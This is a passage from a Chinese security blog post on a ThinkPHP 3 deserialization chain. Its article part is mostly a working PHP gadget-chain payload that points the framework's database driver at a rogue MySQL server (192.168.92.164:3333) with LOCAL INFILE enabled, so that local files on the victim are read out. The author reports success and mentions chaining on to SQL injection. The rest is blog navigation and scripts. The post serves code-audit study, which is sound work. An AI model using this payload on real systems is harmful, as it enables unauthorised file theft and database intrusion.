+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$config</span>)) &#123;</span><br><span class="line">        <span class="variable">$config</span> = <span class="keyword">$this</span>-&gt;config;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">	<span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>] = <span class="keyword">new</span> PDO(<span class="variable">$config</span>[<span class="string">&#x27;dsn&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>], <span class="keyword">$this</span>-&gt;options);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>];</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>所以我们可以控制 tp3 连接的数据库，自然想到了 Rogue mysql server</p>
+<p><strong>原理简单来说是这样的：</strong></p>
+<p>mysql中有一个 SQL语句，为 LOAD DATA LOCAL INFILE。作用是将客户端本地的文件加载到数据库中。而 Rogue mysql server 可以任意读取 mysql 客户端的本地文件。</p>
+<p>具体详情可见本博客的另一篇文章 :)</p>
+<a href="/2021/02/08/2021-02-08-mysql-load-data/" title="Rogue Mysql Server 简单分析">Rogue Mysql Server 简单分析</a>
+
+<br>
+
+<p>尝试让 tp3 连接 Rogue  mysql server。修改 payload，增加数据库配置</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Mysql</span>&#123;</span><br><span class="line">        //新增 <span class="title">mysql</span> 配置</span><br><span class="line">		<span class="title">protected</span> $<span class="title">config</span> = <span class="title">array</span>(</span><br><span class="line">	        &#x27;type&#x27;           =&gt; &#x27;mysql&#x27;, // 数据库类型</span><br><span class="line">	        <span class="string">&#x27;hostname&#x27;</span>       =&gt; <span class="string">&#x27;192.168.92.164&#x27;</span>, <span class="comment">// 服务器地址</span></span><br><span class="line">	        <span class="string">&#x27;username&#x27;</span>       =&gt; <span class="string">&#x27;root&#x27;</span>, <span class="comment">// 用户名</span></span><br><span class="line">	        <span class="string">&#x27;password&#x27;</span>       =&gt; <span class="string">&#x27;123456&#x27;</span>, <span class="comment">// 密码</span></span><br><span class="line">	        <span class="string">&#x27;hostport&#x27;</span>       =&gt; <span class="string">&#x27;3333&#x27;</span>, <span class="comment">// 端口</span></span><br><span class="line">	    );</span><br><span class="line">	    <span class="comment">//设置这个 PDO 才能 LOAD DATA LOCAL</span></span><br><span class="line">	    <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">			<span class="comment">//需要在前面加一个 \ 。不然将会报 PDO not found 的错误</span></span><br><span class="line">	        \PDO::MYSQL_ATTR_LOCAL_INFILE  =&gt; <span class="literal">true</span>,</span><br><span class="line">    	);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">		protected $pk = &#x27;exp&#x27;;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> \Think\Db\Driver\Mysql();</span><br><span class="line">			<span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;data = [</span><br><span class="line">				<span class="string">&#x27;x&#x27;</span> =&gt; [</span><br><span class="line">					<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">111</span>,</span><br><span class="line">				]</span><br><span class="line">			];</span><br><span class="line">			<span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">				<span class="string">&#x27;where&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">                <span class="comment">//!!!注意!!!</span></span><br><span class="line">                <span class="comment">//DELETE 是高风险操作，小心谨慎</span></span><br><span class="line">				<span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;mysql.user where 1=2 #&#x27;</span></span><br><span class="line">			];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Memcache</span>&#123;</span><br><span class="line">		<span class="title">protected</span> $<span class="title">handle</span> = <span class="title">null</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$sessionName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> \Think\Model();</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Imagick</span>&#123;</span><br><span class="line">		<span class="title">private</span> $<span class="title">img</span> = <span class="title">null</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> \Think\Session\Driver\Memcache();</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">	$<span class="title">a</span> = <span class="title">new</span> \<span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>();</span><br><span class="line">	<span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>成功读取客户端文件</p>
+<img src="/2021/03/01/2021-02-28-tp3-x-sql/3.png" style="width:500px;">
+
+<br>
+
+<p>自此文章就写到这了，本来二月十多号开始写的，中间停停写写，最后拖到现在才全部写完。。。</p>
+<p><strong>该漏洞还可继续利用，通过 Rogue  Mysql Server 读取 tp3 的 数据库配置，再利用该配置进行 SQL注入。具体的 Reference 中写了，膜拜下奶权师傅</strong></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/codeAudit/" rel="tag"># codeAudit</a>
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/01/2021-03-01-java-string/" rel="next" title="Java笔记(2) - String相关">
+                <i class="fa fa-chevron-left"></i> Java笔记(2) - String相关
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/03/03/2021-03-03-Closure-inClass/" rel="prev" title="PHP闭包在类中的小笔记">
+                PHP闭包在类中的小笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xiaopan233" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://forum.butian.net/people/483" target="_blank" title="奇安信攻防社区">
+                      
+                        <i class="fa fa-fw fa-globe"></i>奇安信攻防社区</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.anquanke.com/member.html?memberId=144071" target="_blank" title="安全客">
+                      
+                        <i class="fa fa-fw fa-globe"></i>安全客</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.freebuf.com/author/xiaopan233" target="_blank" title="Freebuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Freebuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/xiaopan233/" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hui3c.club/" title="Hui3c 窝" target="_blank">Hui3c 窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.noerrorp.com/" title="YouGe的技术笔记" target="_blank">YouGe的技术笔记</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jingqingg.com/" title="惊青の小窝" target="_blank">惊青の小窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.luolingjiang.com/" title="洛翎酱的小窝" target="_blank">洛翎酱的小窝</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B5%B7%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">反序列化起点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#destroy-%E8%B7%B3%E6%9D%BF"><span class="nav-number">2.</span> <span class="nav-text">destroy()  跳板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Model-delete-%E8%B7%B3%E6%9D%BF"><span class="nav-number">3.</span> <span class="nav-text">Model delete() 跳板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Driver-delete-%E8%B7%B3%E6%9D%BF"><span class="nav-number">4.</span> <span class="nav-text">Driver delete() 跳板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%ACPayload"><span class="nav-number">5.</span> <span class="nav-text">基本Payload</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xiaopan233</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
